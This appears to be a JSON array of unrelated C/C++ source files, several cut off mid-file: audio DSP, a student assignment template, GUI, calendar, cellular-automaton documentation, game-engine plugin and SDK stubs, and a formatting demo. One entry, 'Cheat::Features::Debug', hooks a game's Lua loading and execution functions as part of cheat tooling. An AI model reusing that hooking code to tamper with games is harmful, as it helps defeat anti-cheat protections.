[
    "#include \"daisysp.h\"\n#include \"daisy_seed.h\"\n\n// Interleaved audio definitions\n#define LEFT (i)\n#define RIGHT (i + 1)\n\n// Number of delay lines\n#define LPCF_NUM 8U\n#define APF_NUM 4U\n\nusing namespace daisysp;\nusing namespace daisy;\n\nstatic DaisySeed hw;\n\n// Declare LPF DelayLines\nstatic DelayLine<float, 1U> lpf_del_L[LPCF_NUM];\nstatic DelayLine<float, 1U> lpf_del_R[LPCF_NUM];\n\n// Declare FBCF DelayLines\nstatic DelayLine<float, 4999U + 1U> comb_del_L[LPCF_NUM];\nstatic DelayLine<float, 4999U + 1U> comb_del_R[LPCF_NUM];\n\n// Declare APF DelayLines\nstatic DelayLine<float, 557U + 1U> apf_del_L[APF_NUM];\nstatic DelayLine<float, 557U + 1U> apf_del_R[APF_NUM];\n\n// Number of primes\n#define PRIMES_NUM 669\n\nconst unsigned short primes[PRIMES_NUM] = {\n2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,\n997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,\n1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311,2333,2339,2341,2347,2351,2357,2371,2377,2381,2383,2389,2393,2399,2411,2417,2423,2437,2441,2447,2459,2467,2473,2477,2503,2521,2531,2539,2543,2549,2551,2557,2579,2591,2593,2609,2617,2621,2633,2647,2657,2659,2663,2671,2677,2683,2687,2689,2693,2699,2707,2711,2713,2719,2729,2731,2741,2749,2753,2767,2777,2789,2791,2797,2801,2803,2819,2833,2837,2843,2851,2857,2861,2879,2887,2897,2903,2909,2917,2927,\n2939,2953,2957,2963,2969,2971,2999,3001,3011,3019,3023,3037,3041,3049,3061,3067,3079,3083,3089,3109,3119,3121,3137,3163,3167,3169,3181,3187,3191,3203,3209,3217,3221,3229,3251,3253,3257,3259,3271,3299,3301,3307,3313,3319,3323,3329,3331,3343,3347,3359,3361,3371,3373,3389,3391,3407,3413,3433,3449,3457,3461,3463,3467,3469,3491,3499,3511,3517,3527,3529,3533,3539,3541,3547,3557,3559,3571,3581,3583,3593,3607,3613,3617,3623,3631,3637,3643,3659,3671,3673,3677,3691,3697,3701,3709,3719,3727,3733,3739,3761,3767,3769,3779,3793,3797,3803,3821,3823,3833,3847,3851,3853,3863,3877,3881,3889,3907,3911,3917,3919,3923,3929,3931,3943,3947,3967,3989,4001,\n4003,4007,4013,4019,4021,4027,4049,4051,4057,4073,4079,4091,4093,4099,4111,4127,4129,4133,4139,4153,4157,4159,4177,4201,4211,4217,4219,4229,4231,4241,4243,4253,4259,4261,4271,4273,4283,4289,4297,4327,4337,4339,4349,4357,4363,4373,4391,4397,4409,4421,4423,4441,4447,4451,4457,4463,4481,4483,4493,4507,4513,4517,4519,4523,4547,4549,4561,4567,4583,4591,4597,4603,4621,4637,4639,4643,4649,4651,4657,4663,4673,4679,4691,4703,4721,4723,4729,4733,4751,4759,4783,4787,4789,4793,4799,4801,4813,4817,4831,4861,4871,4877,4889,4903,4909,4919,4931,4933,4937,4943,4951,4957,4967,4969,4973,4987,4993,4999\n};\n\nunsigned int selectedPrimes[LPCF_NUM];\n\n//float comb_g = 0.84f;\n\nfloat x, sig_out_L, sig_out_R;\nfloat lpf_y;\nfloat comb_del_out, comb_y, parallel_combs_L, parallel_combs_R;\nfloat apf_del_out, apf_feedback, apf_y_L, apf_y_R;\nunsigned char idx;\n\n// Potentiometer controls\nfloat wetCV;\nfloat lengthCV;\nfloat densityCV;\nfloat feedbackGainCV;\n\n\nstatic void AudioCallback(AudioHandle::InterleavingInputBuffer  in,\n                          AudioHandle::InterleavingOutputBuffer out,\n                          size_t                                size)\n{\n\n    for(size_t i = 0; i < size; i += 2)\n    {\n\n        x = 0.5f * (in[LEFT] + in[RIGHT]); // mono input\n\n        // Parallel LPCFs\n        parallel_combs_L = 0;\n\t\tparallel_combs_R = 0;\n        for(idx = 0; idx < LPCF_NUM; idx++) {\n\n\t\t\t// Read & output - LEFT\n            comb_del_out = comb_del_L[idx].Read();\n            parallel_combs_L += comb_del_out / LPCF_NUM; // Take output here\n\n\t\t\t// LPF - LEFT\n            lpf_y = (0.8f * comb_del_out) + (0.2f * lpf_del_L[idx].Read());\n            lpf_del_L[idx].Write(lpf_y);\n\n\t\t\t// Comb - LEFT\n    ",
    "#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include \"FoodOrder.h\"\n#include \"FoodOrder.h\"\n\n// Cheching if header guards exist and follow convention.\n#ifndef SENECA_FOODORDER_H\n    #error \"The header guard for 'FoodOrder.h' doesn't follow the convention!\"\n#endif\n\nint cout = 0; // won't compile if headers don't follow convention regarding namespaces\n\n/* input file format: a comma separated set of fields with a consistent format of\n<Order Tag>,<Customer Name>,<Order Description>,<Price>,<Daily Special Status>\n\n<Order Tag> can be one of:\n\tI - In house order\n\tD - Delivery order\n\n<Daily Special Status> can be one of:\n\tY - Is a daily special\n\tN - Is not a daily special\n*/\n\n// TODO: write the prototype for the main function\n//         to accept command line arguments\n\n{\n\tstd::cout << \"Command Line:\\n\";\n\tstd::cout << \"--------------------------\\n\";\n\t// TODO: print the command line here, in the format\n\t//   1: first argument\n\t//   2: second argument\n\t//   3: third argument\n\t//   ...\n\n\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\t// Keep a record of the In House and Delivery orders separately\n\tseneca::FoodOrder recordedDeliveryOrders[6];\n\t// Keep a count of how many orders recorded\n\tsize_t numDeliveries = 0;\n\n\tseneca::FoodOrder currentOrder;\n\n\tfor (auto day = 1; day < argc; ++day)\n\t{\n\n\t\t// Rates change from day 1 to day 2\n\t\tif (day == 1){\n\t\t\tg_taxrate = 0.13;\n\t\t\tg_dailydiscount = 1.15;\n\t\t}\n\t\telse{\n\t\t\tg_taxrate = 0.14;\n\t\t\tg_dailydiscount = 1.20;\n\t\t}\n\n\t\t// each parameter contains the orders from one day, process each one at a time\n\t\tstd::cout << \"--------------------\\n\";\n\t\tstd::cout << \"    Day \" << day << '\\n';\n\t\tstd::cout << \"--------------------\\n\";\n\t\tstd::cout << \"Name          |Order Description        |Price w/Tax |Special Price\" << std::endl;\n\t\tstd::ifstream in(argv[day]);\n\t\tif (in.is_open() == false)\n\t\t{\n\t\t\tstd::cout << \"Cannot open file [\" << argv[day] << \"]. Ignoring it!\\n\";\n\t\t\tcontinue; // go to the next iteration of the loop\n\t\t}\n\t\tchar ordertag = '\\0';\n\n\t\t// loop through each order in the file\n\t\twhile (in) {\n\n\t\t\t\t// read in the ordertag\n\t\t\t\tin >> ordertag;\n\t\t\t\t// skip the delimiter\n\t\t\t\tin.ignore();\n\n\t\t\t\t// end of the file\n\t\t\t\tif (in.fail())\n\t\t\t\t\tbreak;\n\n\t\t\t\t// read in the rest of the data as a FoodOrder\n\t\t\t\tcurrentOrder.read(in);\n\n\t\t\t\t// Handle the in house and delivery orders differently\n\t\t\t\tif (ordertag == 'I') {\n\t\t\t\t\tseneca::FoodOrder copy = currentOrder;\n\t\t\t\t\tcopy.display();\n\t\t\t\t}\n\t\t\t\telse if (ordertag == 'D'){ // adds the delivery orders to the record\n\t\t\t\t\trecordedDeliveryOrders[numDeliveries++] = currentOrder;\n\t\t\t\t\tcurrentOrder.display();\n\t\t\t\t}\n\t\t}\n\t}\n\n\t// print the recorded orders\n\tstd::cout << \"--------------------\\n\";\n\tstd::cout << \"Recorded Delivery Food Orders\\n\";\n\tstd::cout << \"--------------------\\n\";\n\tstd::cout << \"Name          |Order Description        |Price w/Tax |Special Price\" << std::endl;\n\tfor (auto i = 0u; i < numDeliveries; ++i)\n\t\trecordedDeliveryOrders[i].display();\n\tstd::cout << \"--------------------\\n\";\n\n\treturn cout;\n}\n",
    "#include <iostream>\n#include \"CssManager.h\"\n\nCssManager::CssManager() {\n    provider = gtk_css_provider_new();\n    provider2 = gtk_css_provider_new();\n    context = gtk_style_context_new();\n}\nCssManager::~CssManager() {\n    g_object_unref(provider);\n    g_object_unref(provider2);\n    g_object_unref(context);\n}\n\n// Load styles from a file\nvoid CssManager::loadFromFile(const gchar *filename) {\n    gtk_css_provider_load_from_file(provider, g_file_new_for_path(filename), nullptr);\n    gtk_style_context_add_provider_for_screen(gdk_screen_get_default(),\n                                              GTK_STYLE_PROVIDER(provider),\n                                              GTK_STYLE_PROVIDER_PRIORITY_USER);\n}\n// Load styles from a string\nvoid CssManager::loadFromData(const gchar *data) {\n    gtk_css_provider_load_from_data(provider2, data, -1, nullptr);\n    gtk_style_context_add_provider_for_screen(gdk_screen_get_default(),\n                                              GTK_STYLE_PROVIDER(provider2),\n                                              GTK_STYLE_PROVIDER_PRIORITY_USER);\n}\nvoid CssManager::loadFromHex(unsigned char* hex, unsigned int hex_len) {\n    std::string decoded_text;\n\n    for (unsigned int i = 0; i < hex_len; ++i) {\n        decoded_text += hex[i];\n    }\n\n    CssManager::loadFromData(decoded_text.c_str());\n}",
    "#include <iostream>\n#include <iomanip>\n\nint main() {\n    int year, month;\n\n    std::cout << \"Enter year: \";\n    std::cin >> year;\n\n    std::cout << \"Enter month (1-12): \";\n    std::cin >> month;\n\n    int daysInMonth;\n    if (month == 2) {\n        if ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)) {\n            daysInMonth = 29;\n        } else {\n            daysInMonth = 28;\n        }\n    } else if (month == 4 || month == 6 || month == 9 || month == 11) {\n        daysInMonth = 30;\n    } else {\n        daysInMonth = 31;\n    }\n\n    int startDay = (year - 1) * 365 + (year - 1) / 4 - (year - 1) / 100 + (year - 1) / 400;\n    for (int i = 1; i < month; i++) {\n        if (i == 2) {\n            if ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)) {\n                startDay += 29;\n            } else {\n                startDay += 28;\n            }\n        } else if (i == 4 || i == 6 || i == 9 || i == 11) {\n            startDay += 30;\n        } else {\n            startDay += 31;\n        }\n    }\n    startDay %= 7;\n\n    std::cout << \"---------------------------\" << std::endl;\n    std::cout << \"        \" << std::setw(4) << year << \"         \" << std::endl;\n    std::cout << \"---------------------------\" << std::endl;\n    std::cout << \" Sun Mon Tue Wed Thu Fri Sat\" << std::endl;\n    std::cout << \"---------------------------\" << std::endl;\n\n    for (int i = 0; i < startDay; i++) {\n        std::cout << \"    \";\n    }\n\n    for (int day = 1; day <= daysInMonth; day++) {\n        std::cout << std::setw(4) << day;\n\n        if ((startDay + day) % 7 == 0) {\n            std::cout << std::endl;\n        }\n    }\n\n    std::cout << std::endl << \"---------------------------\" << std::endl;\n\n    return 0;\n}",
    "const char* const doc_about =\n    R\"(In these documents (as well as the ones opened in 'Load file' or 'Clipboard'), you can left-click the rules to load them, or right-click the lines to copy the text (drag to select multiple lines).\n\nThis program is for exploring \"MAP rules\". The project originated from a trivial program I made in 2021, which was poorly written and never made public. Still, I managed to find some interesting discoveries with it (by looking through many, many randomized rules). Here are two of them.\n\nMAP+sQSUIzICkiQgAiAEKBAhrIGFgAUbAAA4AChgnAAAw6CAkAIgKCAlASgIACgIQBbqCqhEQAAkFQAARIDAQQRBA\nMAP7KV6wLHQiAHIPICBCAhlIqKAhAuKAFBoYmCFEAACIUzbAIAsAsCBJoAANhiIBEBSUICEMQiQFgRBgAJKgAA4gA\n\nThe project was then abandoned for many years. Last year I felt an urgency to bring it to completion. Thankfully it's mostly finished now.\n)\";\n\n// TODO: about MAP rules...\n// TODO: about the lock & capture feature...\nconst char* const doc_overview =\n    R\"(At any time, the program has a rule shown in the right plane (which is an editable torus space; the operations are recorded in the tooltips (...)). This is later called the \"current rule\". As you see, it is the Game-of-Life rule initially.\n\nThe MAP-string for the current rule is shown at the top taking up a single line. You can right-click the text to save to the clipboard. The paths in the 'Load file' window can be copied in the same way.\nThe program keeps the record for the current rule. You can undo/redo via '<| Prev/Next |>' (above the MAP-string). The program manages several sequences of rules in the form of 'First Prev/Next Last'. When a sequence is activated, the left/right arrow keys will be bound to its 'Prev/Next' for convenience.\n\nIn the right plane, you can right-click to select area and press 'C' (no need for 'Ctrl') to save the pattern as RLE-string to the clipboard, or press 'V' to paste the pattern from the clipboard (left-click to decide where to paste).\n(When pasting patterns to white background, you'd need to set 'Background' to 1 in the 'Range operations' window.)\n\nIn these documents, as well as those opened in 'Load file' or 'Clipboard', you can left-click the rule-string to replace the current rule, or right-click to copy the lines to the clipboard (drag to select multiple lines).\nFor example, here is an RLE blob (a \"rocket\" in the Day & Night rule) - you can firstly click the header line to load the rule, and then copy the following lines (from '3bo...' up to the '!' mark) to paste and see the effect.\nx = 7, y = 14, rule = MAPARYBFxZoF34WaBd+aIF+6RZoF35ogX7paIF+6YEX6ZcWaBd+aIF+6WiBfumBF+mXaIF+6YEX6ZeBF+mXF3+Xfw\n3bo3b$2b3o2b$b5ob$ob3obo$2b3o2b$2b3o2b$ob3obo$ob3obo$b5ob$b\n5ob$3bo3b$7b$2b3o2b$2bobo2b!\n\nThe left plane provides ways to analyze and modify the current rule based on a series of subsets. For detailed descriptions see the next section (\"Subset, mask and rule operations\"). In short:\nThe subsets that the current rule belongs to will be marked with light-green borders.\nYou need to firstly specify a \"working set\", which is the set you are going to explore. You can select multiple subsets - the program will calculate the intersection of them as the working set. For example, if you select 'All' (isotropic rules; selected by default) and 'S.c.' (self-complementary rules), you are going to explore the rules that are both isotropic and self-complementary.\nThen you need to select a \"mask\" (masking rule) to guide how to observe the current rule and generate new rules.\nTo modify the current rule:\n'Randomize' generates random rules in the working set with specified \"distance\" (number of groups where two rules have different values) to the masking rule.\n'<00.. Prev/Next 11..>' generates rules based on the mask and current rule, so that the current rule will iterate through the whole working set - firstly the masking rule, then all rules with distance = 1 to the masking rule, then 2, ..., until max distance.\n(The current rule should belong to the working set to enable 'Prev/Next'.)\nIn the random-access section, the values of the current rule are viewed through the mask and grouped by the working set. By clicking a group you will flip all values of the current rule in that group. By turning on 'Preview mode' you are able to see the effect without replacing the current rule.\n\nThe program also has a way to generate rules ensuring certain value constraints (allowing for certain patterns). For example, in this program it's easy to find rules like this:\nMAPARYSZhYAPEgSaBCgCAAAgABAEsAIAIgASIDgAIAAgAASQAIAaACggACAAICAAIAASICogIAAAACAAAAAAAAAAA\nSee the \"Lock and capture\" section for details.\n)\";\n\nconst char* const doc_workings =\n    R\"(This section describes the exact workings of subsets, masks and major rule operations. If you are not familiar with this program, I'd recommend firstly checking the \"Rules in different subsets\" section to get some sense about what can be found with this program.\n\nThe program works with a series of subsets, each representing cer",
    "\ufeff#include \"plugin.h\"\n#include \"main.h\"\n\nCServerPlugin g_EmtpyServerPlugin;\nEXPOSE_SINGLE_INTERFACE_GLOBALVAR(CServerPlugin, IServerPluginCallbacks, INTERFACEVERSION_ISERVERPLUGINCALLBACKS, g_EmtpyServerPlugin);\n\n//---------------------------------------------------------------------------------\n// Purpose: constructor/destructor\n//---------------------------------------------------------------------------------\nCServerPlugin::CServerPlugin()\n{\n\tm_iClientCommandIndex = 0;\n}\n\nCServerPlugin::~CServerPlugin()\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when the plugin is loaded, load the interface we need from the engine\n//---------------------------------------------------------------------------------\nbool CServerPlugin::Load(CreateInterfaceFn interfaceFactory, CreateInterfaceFn gameServerFactory)\n{\n\tVProfLoad();\n\n\treturn true;\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when the plugin is unloaded (turned off)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::Unload(void)\n{\n\tVProfUnload();\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when the plugin is paused (i.e should stop running but isn't unloaded)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::Pause(void)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when the plugin is unpaused (i.e should start executing again)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::UnPause(void)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: the name of this plugin, returned in \"plugin_print\" command\n//---------------------------------------------------------------------------------\nconst char * CServerPlugin::GetPluginDescription(void)\n{\n\treturn \"VProf v0.1\";\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level start\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::LevelInit(char const *pMapName)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level start, when the server is ready to accept client connections\n//\t\tedictCount is the number of entities in the level, clientMax is the max client count\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ServerActivate(edict_t *pEdictList, int edictCount, int clientMax)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called once per server frame, do recurring work here (like checking for timeouts)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::GameFrame(bool simulating)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level end (as the server is shutting down or going to a new map)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::LevelShutdown(void) // !!!!this can get called multiple times per map change\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when a client spawns into a server (i.e as they begin to play)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ClientActive(edict_t *pEntity)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when a client leaves a server (or is timed out)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ClientDisconnect(edict_t *pEntity)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when a client spawns?\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ClientPutInServer(edict_t *pEntity, char const *playername)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level start\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::SetCommandClient(int index)\n{\n\tm_iClientCommandIndex = index;\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level start\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ClientSettingsChanged(edict_t *pEdict)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purp",
    "#include \"Debug.h\"\n#include \"HookManager.h\"\n#include \"Utils.h\"\n#include \"game-utils.hpp\"\n#include \"events.h\"\n\nnamespace Cheat::Features\n{\n\tDebug::Debug()\n\t{\n\t\tevents::GameUpdateEvent += MY_METHOD_HANDLER(Debug::OnGameUpdate);\n\n\t\tHookManager::install(app::LuaDLL_lua_ptrtostring, LuaDLL_lua_ptrtostring_Hook);\n\t\tHookManager::install(app::LuaDLL_lua_tostring, LuaDLL_lua_tostring_Hook);\n\t\tHookManager::install(app::LuaDLL_luaL_loadbuffer, LuaDLL_luaL_loadbuffer_Hook);\n\t\tHookManager::install(app::LuaDLL_luaL_loadstring, LuaDLL_luaL_loadstring_Hook);\n\t\tHookManager::install(app::LuaDLL_luaL_dostring, LuaDLL_luaL_dostring_Hook);\n\n\t\tHookManager::install(app::LuaState_DoString, LuaState_DoString_Hook);\n\t\tHookManager::install(app::LuaState_DoString_1, LuaState_DoString_1_Hook);\n\t\tHookManager::install(app::LuaState_LuaLoadBuffer, LuaState_LuaLoadBuffer_Hook);\n\t\tHookManager::install(app::LuaStatePtr_LuaLoadBuffer, LuaStatePtr_LuaLoadBuffer_Hook);\n\t\tHookManager::install(app::LuaState_LuaLoadBuffer_1, LuaState_LuaLoadBuffer_1_Hook);\n\t\tLOG_DEBUG(\"Hooked Lua functions\");\n\t}\n\n\tvoid Debug::OnGameUpdate()\n\t{\n\t}\n\n\tapp::String* Debug::LuaDLL_lua_ptrtostring_Hook(void* str, int32_t len, MethodInfo* method)\n\t{\n\t\t// LOG_DEBUG(\"LuaDLL_lua_ptrtostring_Hook\");\n\t\treturn CALL_ORIGIN(LuaDLL_lua_ptrtostring_Hook, str, len, method);\n\t}\n\tapp::String* Debug::LuaDLL_lua_tostring_Hook(void* luaState, int32_t index, MethodInfo* method)\n\t{\n\t\t// LOG_DEBUG(\"LuaDLL_lua_tostring_Hook\");\n\t\tauto ret = CALL_ORIGIN(LuaDLL_lua_tostring_Hook, luaState, index, method);\n\t\t// LOG_DEBUG(\"%s\", il2cppi_to_string(ret).c_str());\n\n\t\treturn ret;\n\t}\n\tint32_t Debug::LuaDLL_luaL_loadbuffer_Hook(void* luaState, app::Byte__Array* buff, int32_t size, app::String* name, MethodInfo* method)\n\t{\n\t\tLOG_DEBUG(\"LuaDLL_luaL_loadbuffer_Hook\");\n\t\treturn CALL_ORIGIN(LuaDLL_luaL_loadbuffer_Hook, luaState, buff, size, name, method);\n\t}\n\tint32_t Debug::LuaDLL_luaL_loadstring_Hook(void* luaState, app::String* chunk, MethodInfo* method)\n\t{\n\t\tLOG_DEBUG(\"LuaDLL_luaL_loadstring_Hook\");\n\t\treturn CALL_ORIGIN(LuaDLL_luaL_loadstring_Hook, luaState, chunk, method);\n\t}\n\tbool Debug::LuaDLL_luaL_dostring_Hook(void* luaState, app::String* chunk, MethodInfo* method)\n\t{\n\t\tLOG_DEBUG(\"LuaDLL_luaL_dostring_Hook\");\n\t\treturn CALL_ORIGIN(LuaDLL_luaL_dostring_Hook, luaState, chunk, method);\n\t}\n\n\tvoid Debug::LuaState_DoString_Hook(app::LuaState* __this, app::String* chunk, app::String* chunkName, MethodInfo* method)\n\t{\n\t\tLOG_DEBUG(\"LuaState_DoString_Hook\");\n\t\tCALL_ORIGIN(LuaState_DoString_Hook, __this, chunk, chunkName, method);\n\t}\n\tapp::Object* Debug::LuaState_DoString_1_Hook(app::LuaState* __this, app::String* chunk, app::String* chunkName, MethodInfo* method)\n\t{\n\t\tLOG_DEBUG(\"LuaState_DoString_1_Hook\");\n\t\treturn CALL_ORIGIN(LuaState_DoString_1_Hook, __this, chunk, chunkName, method);\n\t}\n\tvoid Debug::LuaState_LuaLoadBuffer_Hook(app::LuaState* __this, app::Byte__Array* buffer, app::String* chunkName, MethodInfo* method)\n\t{\n\t\tLOG_DEBUG(\"LuaState_LuaLoadBuffer_Hook\");\n\t\tCALL_ORIGIN(LuaState_LuaLoadBuffer_Hook, __this, buffer, chunkName, method);\n\t}\n\tint32_t Debug::LuaStatePtr_LuaLoadBuffer_Hook(app::LuaStatePtr* __this, app::Byte__Array* buff, int32_t size, app::String* name, MethodInfo* method)\n\t{\n\t\tLOG_DEBUG(\"LuaStatePtr_LuaLoadBuffer_Hook\");\n\t\treturn CALL_ORIGIN(LuaStatePtr_LuaLoadBuffer_Hook, __this, buff, size, name, method);\n\t}\n\tapp::Object* Debug::LuaState_LuaLoadBuffer_1_Hook(app::LuaState* __this, app::Byte__Array* buffer, app::String* chunkName, MethodInfo* method)\n\t{\n\t\tLOG_DEBUG(\"LuaState_LuaLoadBuffer_1_Hook\");\n\t\treturn CALL_ORIGIN(LuaState_LuaLoadBuffer_1_Hook, __this, buffer, chunkName, method);\n\t}\n}\n",
    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// BlueprintGeneratedClass CommonUI_XboxBrushData.CommonUI_XboxBrushData_C\n// (None)\n\nclass UClass* UCommonUI_XboxBrushData_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"CommonUI_XboxBrushData_C\");\n\n\treturn Clss;\n}\n\n\n// CommonUI_XboxBrushData_C CommonUI_XboxBrushData.Default__CommonUI_XboxBrushData_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass UCommonUI_XboxBrushData_C* UCommonUI_XboxBrushData_C::GetDefaultObj()\n{\n\tstatic class UCommonUI_XboxBrushData_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<UCommonUI_XboxBrushData_C*>(UCommonUI_XboxBrushData_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n}\n\n\n",
    "#include \"pagebuilder.h\"\n#include \"pagebox.h\"\n#include \"boxview.h\"\n\n#include <cmath>\n\nnamespace plutobook {\n\nPageBuilder::PageBuilder(Document* document)\n    : m_document(document)\n    , m_pages(document->pages())\n{\n    assert(m_pages.empty());\n}\n\nvoid PageBuilder::build()\n{\n    if(!m_document->width() || !m_document->height())\n        return;\n    auto box = m_document->box();\n    auto child = box->firstBoxFrame();\n    while(child) {\n        child->paginate(*this, 0.f);\n        child = child->nextBoxFrame();\n    }\n\n    addPageUntil(box, m_document->height());\n    setPageBreakAt(m_document->height());\n}\n\nvoid PageBuilder::enterBox(const BoxFrame* box, float top)\n{\n    addPageUntil(box, top);\n    if(box->style()->pageBreakBefore() == BreakBetween::Always) {\n        setPageBreakAt(top);\n    } else if(box->style()->pageBreakInside() == BreakInside::Avoid\n        && !canFitOnPage(top + box->height())) {\n        setPageBreakAt(top);\n    }\n}\n\nvoid PageBuilder::exitBox(const BoxFrame* box, float top)\n{\n    addPageUntil(box, top + box->height());\n    if(box->style()->pageBreakAfter() == BreakBetween::Always) {\n        setPageBreakAt(top + box->height());\n    }\n}\n\nconstexpr PseudoType pagePseudoType(size_t pageIndex)\n{\n    if(pageIndex == 0)\n        return PseudoType::FirstPage;\n    if(pageIndex % 2)\n        return PseudoType::LeftPage;\n    return PseudoType::RightPage;\n}\n\nvoid PageBuilder::addPageUntil(const BoxFrame* box, float top)\n{\n    while(!canFitOnPage(top)) {\n        newPage(box, !m_currentPage ? 0.f : m_currentPage->pageBottom());\n    }\n}\n\nvoid PageBuilder::setPageBreakAt(float top)\n{\n    if(m_currentPage && top > m_currentPage->pageTop()) {\n        m_currentPage->setPageBottom(std::floor(top));\n    }\n}\n\nbool PageBuilder::canFitOnPage(float top) const\n{\n    return m_currentPage && top <= m_currentPage->pageBottom();\n}\n\nvoid PageBuilder::newPage(const BoxFrame* box, float top)\n{\n    auto pageStyle = m_document->styleForPage(emptyGlo, m_pages.size(), pagePseudoType(m_pages.size()));\n    auto pageBox = PageBox::create(pageStyle, emptyGlo, m_pages.size());\n    pageBox->build();\n    pageBox->layout();\n\n    auto pageWidth = std::max(1.f, pageBox->width() - pageBox->marginWidth());\n    auto pageHeight = std::max(1.f, pageBox->height() - pageBox->marginHeight());\n    if(auto pageScale = pageStyle->pageScale()) {\n        pageBox->setPageScale(pageScale.value());\n    } else {\n        pageBox->setPageScale(pageWidth / m_document->width());\n    }\n\n    pageBox->setPageTop(std::ceil(top));\n    pageBox->setPageBottom(std::ceil(top + (pageHeight / pageBox->pageScale())));\n    m_currentPage = pageBox.get();\n    m_pages.push_back(std::move(pageBox));\n}\n\n} // namespace plutobook\n",
    "#include \"fmt_eigen.h\"\n#include \"fmt/color.h\"\nint main() {\n    Eigen::Matrix<double, 2, 2> matrix;\n    matrix << 1.234567, 2.345678, 3.456789, 4.567890;\n\n    Eigen::Matrix<double, 2, 2> transposed = matrix.transpose();\n    Eigen::Vector3d vec(1, 2, 3);\n\n    fmt::print(\"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(\"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec); // Specify precision of 4\n\n    fmt::print(\"Matrix Transposed:\\n{:.4f}\\n\", transposed); // Specify precision of 4\n    fmt::print(\"Matrix col or row:\\n{:.4f}\\n\", matrix.col(0)); // Specify precision of 4\n    fmt::print(\"Matrix Bolck:\\n{}\\n\", matrix.block<1,1>(0,0)); // Specify precision of 4\n    fmt::print(\"Matrix Diagonal:\\n{}\\n\", matrix.diagonal()); // Specify precision of 4\n\n    fmt::print(fg(fmt::color::steel_blue), \"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(bg(fmt::color::lime_green)|fg(fmt::color::indian_red),\n               \"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec);\n    fmt::print(fg(fmt::color::gold)|fmt::emphasis::blink, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n    fmt::print(fg(fmt::color::steel_blue)|fmt::emphasis::bold, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n\n    getchar();\n    return 0;\n}\n",
